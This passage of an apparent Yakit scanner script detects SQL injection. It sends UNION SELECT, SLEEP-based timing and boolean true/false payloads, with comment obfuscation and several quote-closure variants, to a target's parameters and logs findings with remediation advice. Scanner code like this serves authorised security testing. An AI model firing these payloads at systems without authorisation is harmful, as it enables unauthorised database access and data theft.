                                                                                                                                       md5Randstr),
                                                                                                                                 parseInt(columnNum))
                }


                payload = str.TrimRight(payload, ",") + "-- "
                //yakit_output(payload)
                result, _ := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                md5CheckVal := codec.Md5(md5Randstr)
                //yakit_output(md5CheckVal)
                //yakit_output(string(result.ResponseRaw))
                if str.RegexpMatch(md5CheckVal, result.ResponseRaw) {
                    yakit_output(str.f(
                        "exists UNION SQL injection: [Parameter name: %v original value: %v]",
                        param.Name(),
                        param.Value(),
                    ))
                    risk.NewRisk(
                        result.Url,
                        risk.severity("critical"),
                        risk.title(str.f("UNION SQL Injection: [%v:%v]", param.Name(), param.Value())),
                        risk.titleVerbose(str.f(
                            "There is UNION SQL injection: [Parameter name: %v Value: %v]",
                            param.Name(),
                            param.Value(),
                        )),
                        risk.description("Union-Based SQL injection is a common SQL injection attack technology, by using the UNION operation in the query statement of the application operator to obtain sensitive information in the database. Attackers use the UNION operator to merge malicious SELECT queries with normal query results, thereby leaking database data."),
                        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                        risk.type("sqlinjection"),
                        risk.request(result.RequestRaw),
                        risk.response(result.ResponseRaw),
                        risk.payload(payload),
                        risk.parameter(param.Name()),
                    )
                    yakit_output(str.f(
                        "There is injection based on UNION SQL: [Parameter name: %v Original value: %v]",
                        param.Name(),
                        param.Value()[0],
                    ))
                    yakit_output(str.f("UNION column number detected by UNION BruteForce ratio is" + columnNum))
                    return parseInt(columnNum)
                }

            }

        }

    }


    for index, param := range CommonParams {
        if index == pos {
            for i := LOWER_COUNT; i <= UPPER_COUNT; i++ {
                if lineBreak {
                    payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
                                                                                                                                 randStr,
                                                                                                                                 (i - 1))
                } else {
                    payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
                                                                                                                          randStr,
                                                                                                                          (i - 1))
                }


                payload += sprintf(`SLeep(%v)-- `, standardRespTime * 2 / 1000 + 3)

                //println(payload)
                result, err := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
                                                             fuzz.WithTimeOut(30))
                if err != nil {
                    yakit_output("Try to detect Union SQL Injection Payload failed")
                    return
                }


                if result.ServerDurationMs > standardRespTime * 2 + 1000 {
                    yakit_output(str.f(
                        "exists UNION SQL injection: [Parameter name: %v original value: %v]",
                        param.Name(),
                        param.Value(),
                    ))
                    //codecPayload = codec.StrconvQuote(string(payload))

                    risk.NewRisk(
                        result.Url,
                        risk.severity("critical"),
                        risk.title(str.f("UNION SQL Injection: [%v:%v]", param.Name(), param.Value())),
                        risk.titleVerbose(str.f(
                            "There is UNION SQL injection: [Parameter name: %v Value: %v]",
                            param.Name(),
                            param.Value(),
                        )),
                        risk.description("Union-Based SQL injection is a common SQL injection attack technology, by using the UNION operation in the query statement of the application operator to obtain sensitive information in the database. Attackers use the UNION operator to merge malicious SELECT queries with normal query results, thereby leaking database data."),
                        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                        risk.type("sqlinjection"),
                        risk.request(result.RequestRaw),
                        risk.response(result.ResponseRaw),
                        risk.payload(payload),
                        risk.parameter(param.Name()),
                    )
                    yakit_output(str.f(
                        "There may be UNION SQL injection: [Parameter name: %v Original value: %v]",
                        param.Name(),
                        param.Value()[0],
                    ))
                    yakit_output(str.f("UNION column number is detected as" + parseStr(i)))
                    return i
                } else {
                    time.Sleep(0.5)// Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests                    // Avoid result deviation caused by too frequent requests
                    continue
                }

            }

        }

    }


    return -1
}

//The following is the tool auxiliary function
func getErrorBasedPreCheckPayload() {
    randomTestString := ""
    for i := 0; i < 10; i++ {
        randomTestString += HEURISTIC_CHECK_ALPHABET[randn(0, len(HEURISTIC_CHECK_ALPHABET) - 1)]
    }


    return randomTestString
}

/* Initiate 5 requests to the target and return normal response time */
func getNormalRespondTime(req /* []byte */, isHttps /* bool */) {
    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
    timeRec := []
    //yakit_output(parseString(len(freq.GetCommonParams())))
    //time.sleep(5)
    for i := 0; i < 5; i++ {
        rsp, err := freq.ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
        time.sleep(0.5)
        if err != nil {
            yakit_output("Attempt to detect TimBased-Blind response time failed")
            return err, -1
        }


        timeRec = append(timeRec, rsp.ServerDurationMs)
    }


    return nil, (mean(timeRec) + 7 * stdDeviation(timeRec))
    //99.9999999997440% The normal response time should be less than or equal to this value
}

func mean(v) {
    res = 0
    n = len(v)
    for i := 0; i < n; i++ {
        res += v[i]
    }


    return res / float(n)
}

func stdDeviation(v) {
    variance := func(v) {
        res = 0
        m = mean(v)
        n = len(v)
        for i := 0; i < n; i++ {
            res += (v[i] - m) * (v[i] - m)
        }


        return res / float(n - 1)
    }
    return math.Sqrt(variance(v))
}

func checkParam(param, originValue, originResponse, isNumeric) {
    var res
    for type := 0; type < len(CLOSE_TYPE); type++ {
        time.Sleep(0.5)
        switch type {
case 0:
            res = checkType0(param, originValue, originResponse, isNumeric)
            if res {
                return 0
            }

case 1:
            res = checkType1(param, originValue, originResponse, isNumeric)
            if res {
                return 1
            }

case 2:
            res = checkType2(param, originValue, originResponse, isNumeric)
            if res {
                return 2
            }
            res = checkLimitNoBound(param, originValue, originResponse, isNumeric)
            if res {
                return 2
            }

case 3:
            res = checkType3(param, originValue, originResponse, isNumeric)
            if res {
                return 3
            }

case 4:
            res = checkType4(param, originValue, originResponse, isNumeric)
            if res {
                return 4
            }

case 5:
            res = checkType5(param, originValue, originResponse, isNumeric)
            if res {
                return 5
            }

case 6:
            res = checkType6(param, originValue, originResponse, isNumeric)
            if res {
                return 6
            }

case 7:
            res = checkType7(param, originValue, originResponse, isNumeric)
            if res {
                return 7
            }

case 8:
            res = checkType8(param, originValue, originResponse, isNumeric)
            if res {
                return 8
            }

}

    }


    res = checkTypeOrderBy(param, originValue, originResponse, isNumeric)
    if res {
        die("Detected ORDER BY")//nothing else to do        //nothing else to do
    }


    return -1
}
/* Test ' Closed type */
func checkType0(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }


        return false
    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, rand1, rand1)
        negativePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, rand1, rand1 + 1)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, randString, randString)
        negativePayload = sprintf("%v'/**/AND/**/'%v'='%v", originValue, randString, randstr(5))
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }

    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            "The parameter is %v, assuming a single quote boundary, [%v] is different from the original parameter result",
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] closed in single quotes]",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value:%v single-quote]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[%v] single quotation mark Closed]",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* Test " Closed type */
func checkType1(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, rand1, rand1)
        negativePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, rand1, rand1 + 1)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, randString, randString)
        negativePayload = sprintf(`%v"/**/AND/**/"%v"="%v`, originValue, randString, randstr(5))
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }


    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            "The parameter is %v, assuming double quote boundary, [ %v] is different from the original parameter result",
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] double quote closure]",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value:%v single-quote]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[%v] Double quotes closed]",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* test No closure type */
func checkType2(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf("%v/**/AND/**/%v=%v", originValue, rand1, rand1)
        negativePayload = sprintf("%v/**/AND/**/%v=%v", originValue, rand1, rand1 + 1)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf("%v/**/AND/**/'%v'='%v'", originValue, randString, randString)
        negativePayload = sprintf("%v/**/AND/**/'%v'='%v'", originValue, randString, randstr(5))
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }

    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            "The parameter is %v, assuming no boundary, [%v]",
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] Unbounded closure]",
        paramType,
        param.Name(),
    ))

    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))
    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value:%v single-quote]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[%v] Unbounded closure]",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* test)' Closed type */
func checkType3(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }


        return false
    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, rand1, rand1)
        negativePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, rand1, rand1 + 1)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, randString, randString)
        negativePayload = sprintf("%v)'/**/AND/**/'(%v)'='(%v", originValue, randString, randstr(5))
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            "The parameter is %v, assuming single quote boundaries, [%v] is different from the original parameter result",
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] brackets single quotes closed]",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    yakit_output(http.dump(n1rsp.ResponseRaw))
    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value:%v single-quote]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[% v] Brackets are closed in single quotes]",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* test)" Closed type */
func checkType4(param, originValue, originResponse, IsNumeric) {
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, rand1, rand1)
        negativePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, rand1, rand1 + 1)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, randString, randString)
        negativePayload = sprintf(`%v)"/**/AND/**/"(%v)"="(%v`, originValue, randString, randstr(5))
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            "parameter is %v. It is assumed that the parentheses and double quotes are bounded. The [%v] result is different from the original parameter. The",
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] Brackets double quotes closed]",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value:%v single-quote]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "suspected SQL injection: [Parameter: %v[%v] Brackets and double quotes closed]",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* Test %' like scenario */
func checkType5(param, originValue, originResponse, IsNumeric){
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, rand1, rand1, originValue, originValue)
        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, rand1, rand1 + 1, originValue, originValue)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, randString, randString, originValue, originValue)
        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, randString, randstr(5), originValue, originValue)
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            `The parameter is %v, assuming like single quote boundary, [%v] is different from the original parameter result`,
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] like injection ( '% ))】",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value:%v single-quote like]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "suspected SQL injection: [Parameter: %v[%v] like injection (%%' )】",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
        risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
        risk.type("sqlinjection"),
        risk.payload(negativePayload),
        risk.parameter(param.Name()),
        risk.request(n1rsp.RequestRaw),
        risk.response(n1rsp.ResponseRaw),
    )
    return true
}

/* Test %" like scenario */
func checkType6(param, originValue, originResponse, IsNumeric){
    var positivePayload, negativePayload, paramType
    defer func {
        err := recover()
        if err != nil {
            yakit_output(err)
        }

    }


    if IsNumeric {
        paramType = "Number"
        rand1 := randn(1, 20000)
        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, rand1, rand1, originValue, originValue)
        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, rand1, rand1 + 1, originValue, originValue)
    } else {
        paramType = "String"
        randString := randstr(4)
        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, randString, randString, originValue, originValue)
        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, randString, randstr(5), originValue, originValue)
    }


    res = originResponse
    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)

    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf(("request positive rsp error: %s"), err))
        return false
    }


    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)

    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
    if err != nil {
        yakit_output(sprintf("response negative rsp error: %v", err))
        return false
    }


    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)

    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
        yakit_output("response empty")
        return false
    }



    opResult := str.CalcSimilarity(bodyOrigin, pBody)

    if opResult < UPPER_RATIO_BOUND {
        REASON = sprintf(
            `The parameter is %v, assuming like single quote boundary, [%v] is different from the original parameter result`,
            paramType,
            positivePayload,
        )
        yakit_output(REASON)
        return false
    }


    pnResult := str.CalcSimilarity(pBody, nBody)

    if pnResult > SIMILARITY_RATIO {
        reason = sprintf(
            "The parameter is %v, injection check Failure: Reason: [%v] and [%v] The results are similar to/Same: Similarity: %v",
            paramType,
            positivePayload,
            negativePayload,
            pnResult,
        )
        yakit_output(reason)
        return false
    }


    yakit_output(sprintf(
        "Suspected SQL injection: [Parameter: %v type [%v] like injection (\"% ))】",
        paramType,
        param.Name(),
    ))
    yakit_output(sprintf(
        "test is: %v The response packet is: %s",
        positivePayload,
        string(pBody),
    ))
    yakit_output(sprintf(
        "The negative payload used in the test is: %v The response packet is: %s",
        negativePayload,
        string(nBody),
    ))

    risk.NewRisk(
        res.Url,
        risk.title(sprintf(
            "Maybe SQL Injection: [param - type:str value: %v double-quote like]",
            originValue,
        )),
        risk.titleVerbose(sprintf(
            "Suspected SQL injection: [Parameter: %v[%v] like injection (%%\" )】",
            paramType,
            param.Name(),
        )),
        risk.ignore(true),
        risk.description("SQL injection is a common security vulnerability, which refers to an attacker inserting malicious SQL code into the input field of an application to bypass the applications validation and filtering mechanisms, perform unauthorized operations on the database, or obtain Sensitive data. This type of vulnerability may lead to serious consequences such as data leakage, data corruption, unauthorized access, denial of service and complete system crash."),
